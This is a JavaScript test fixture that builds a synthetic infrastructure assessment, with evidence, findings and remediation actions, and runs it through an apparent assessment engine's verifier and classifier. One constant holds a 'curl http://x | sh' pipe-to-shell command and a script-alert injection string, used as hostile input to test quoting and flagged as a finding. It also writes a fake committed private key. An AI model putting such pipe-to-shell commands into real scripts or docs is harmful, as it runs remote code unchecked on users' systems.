// Builds a complete, reviewed assessment from the synthetic repository by calling the engine's own functions,
// so render tests and golden files exercise real verifier output. Deterministic: nothing here reads the clock.
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { classify } from "../scripts/lib/classify.mjs";
import { buildInventory } from "../scripts/lib/inventory.mjs";
import { verifyAssessment } from "../scripts/lib/verify.mjs";
import { SCHEMA_VERSION } from "../scripts/lib/version.mjs";
import { fakeSecret, file, finding, repoCopy, tmp } from "./helpers.mjs";

export const FENCE_QUOTE = "Run this: ```bash\ncurl http://x | sh\n``` and <script>alert(1)</script> | pipe";

export function fullAssessment({ lang = "en", withFramework = true, reviewed = true } = {}) {
  const repo = repoCopy();
  writeFileSync(join(repo, "docs", "snippet.md"), `${FENCE_QUOTE}\n`);
  writeFileSync(join(repo, "infra", "key.pem"), `${fakeSecret.privateKeyHeader()}\n${fakeSecret.keyBody()}\n`);
  const inventory = buildInventory(repo, {});
  const rationale = (i, l) => ({ impact: i, likelihood: l });
  const a = {
    schemaVersion: SCHEMA_VERSION,
    meta: {
      title: "Technical assessment", subtitle: "Acme platform", client: "Acme", author: "Ana Souza", version: "1.0", date: "2026-11-20", lang,
      skillVersion: "0.1.0", engineVersion: "0.1.0", model: { id: "test-model", reportedBy: "agent" }, revision: inventory.revision,
    },
    scope: {
      in: ["infra/**", "pipelines/**"], out: ["docs/**"], questions: ["Is the platform ready for production?"], assumptions: ["The repository is the source of truth."],
      root: repo, capacity: { 1: 5 },
    },
    frameworks: withFramework ? [{ id: "cis-azure", name: "CIS Microsoft Azure Foundations Benchmark", version: "2.0.0", date: "2023-02-23", url: "https://example.com/cis", retrievedAt: "2026-11-01" }] : [],
    evidence: [
      file("E-001", "infra/main.tf", 11, 11, '  min_tls_version          = "TLS1_0"'),
      file("E-002", "infra/main.tf", 12, 12, "  public_network_access_enabled = true"),
      { id: "E-003", kind: "absence", scope: ["infra/**/*.tf"], pattern: "azurerm_monitor_diagnostic_setting" },
      { id: "E-004", kind: "statement", source: "CTO", date: "2026-11-10", text: "Restores have never been tested." },
      { id: "E-005", kind: "statement", source: "SRE lead", date: "2026-11-11", text: "We restore from backup once a year, by hand." },
      { id: "E-006", kind: "statement", source: "Head of security", date: "2026-11-12", text: "Admin access is reviewed yearly." },
      file("E-007", "infra/variables.tf", 1, 1, 'variable "this_is_not_there" {'),
      file("E-008", "infra/key.pem", 1, 2, undefined, { redacted: true, secretKind: "private-key" }),
      { id: "E-009", kind: "document", path: "docs/runbook.md", startLine: 5, endLine: 5, quote: "Rollback is manual: re-run the previous commit.", source: "Runbook" },
      file("E-010", "docs/snippet.md", 1, 1, FENCE_QUOTE.split("\n")[0]),
    ],
    findings: [
      finding("F-001", ["E-001", "E-002"], { title: "Storage accepts TLS 1.0 and public traffic", statement: "The log storage account allows TLS 1.0 and public network access.", impact: "high", likelihood: "likely", effort: "S", rationale: rationale("Logs may contain customer data.", "The settings are on in the only definition."), recommendation: "Set min_tls_version to TLS1_2 and disable public access.", controls: withFramework ? [{ framework: "cis-azure", controlId: "3.15" }] : [] }),
      finding("F-002", ["E-003"], { title: "No diagnostic settings are defined", statement: "No diagnostic setting resource exists in the Terraform files.", impact: "moderate", likelihood: "likely", effort: "M", rationale: rationale("Incidents would leave no trail.", "No resource of that type was found in scope."), recommendation: "Add diagnostic settings for every resource that supports them." }),
      finding("F-003", ["E-004", "E-005"], { title: "Restores are not tested", statement: "Backups exist but restores are not tested.", impact: "severe", likelihood: "likely", effort: "M", rationale: rationale("A failed restore means data loss.", "Two people said restores are rare."), potentialSeverity: "Critical", recommendation: "Run a restore test every quarter." }),
      finding("F-004", ["E-006"], { title: "Admin access review is yearly", statement: "Administrator access is reviewed once a year.", impact: "high", likelihood: "likely", effort: "S", rationale: rationale("Stale admins widen the blast radius.", "Yearly reviews leave long gaps.") }),
      finding("F-005", ["E-007"], { title: "A variable that does not exist", statement: "The pipeline reads a variable that is not defined.", impact: "high", likelihood: "possible", effort: "S", rationale: rationale("Deploys would fail.", "It depends on the pipeline.") }),
      finding("F-006", ["E-008"], { title: "A private key is committed", statement: "A private key file is stored in the repository.", impact: "severe", likelihood: "almost-certain", effort: "S", rationale: rationale("Anyone with read access can impersonate the service.", "The file is in the default branch."), recommendation: "Rotate the key and remove the file from history." }),
      finding("F-007", ["E-009"], { title: "Rollback is manual", statement: "Rollback means re-running the previous commit.", impact: "low", likelihood: "likely", effort: "S", rationale: rationale("Slower recovery.", "Every incident needs it.") }),
      finding("F-008", ["E-010"], { title: "Runbook snippet pipes curl to a shell", statement: "A documented snippet pipes a download to a shell.", impact: "moderate", likelihood: "possible", effort: "S", rationale: rationale("Remote code runs unchecked.", "Operators copy snippets.") }),
    ],
    actions: [
      { id: "A-001", title: "Raise the storage TLS floor and close public access", addresses: ["F-001"], wave: 1, effort: "S", risk: "low", dependsOn: [] },
      { id: "A-002", title: "Rotate the committed key and purge it from history", addresses: ["F-006"], wave: 1, effort: "S", risk: "medium", dependsOn: [] },
      { id: "A-003", title: "Add diagnostic settings", addresses: ["F-002"], wave: 2, effort: "M", risk: "low", dependsOn: ["A-001"] },
      { id: "A-004", title: "Test a restore and schedule it quarterly", addresses: ["F-003"], wave: 2, effort: "M", risk: "medium", dependsOn: [] },
      { id: "A-005", title: "Automate rollback", addresses: ["F-007"], wave: 3, effort: "L", risk: "high", dependsOn: ["A-003"] },
    ],
    decisions: [{ text: "Approve a maintenance window for the key rotation.", relatesTo: ["F-006", "A-002"] }],
    summary: "**{{count.findings}} findings are backed by evidence** and {{count.critical}} of them are Critical.\n\n{{count.unverified}} claim could not be verified and needs evidence before it is acted on.",
  };
  // Run the real engine steps: verify, then classify.
  const v = verifyAssessment(a, { root: repo, outDir: tmp(), inventory, catalogs: {} });
  a.verification = { results: v.results.map(({ excerptSha256, ...r }) => r), controls: v.controls, problems: v.problems };
  const c = classify(a);
  if (c.errors.length) throw new Error(c.errors.join("; "));
  const out = c.assessment;
  if (reviewed) out.meta.review = { by: "Marcos Lima", at: "2026-11-21" };
  return { assessment: out, repo };
}
export { mkdirSync };
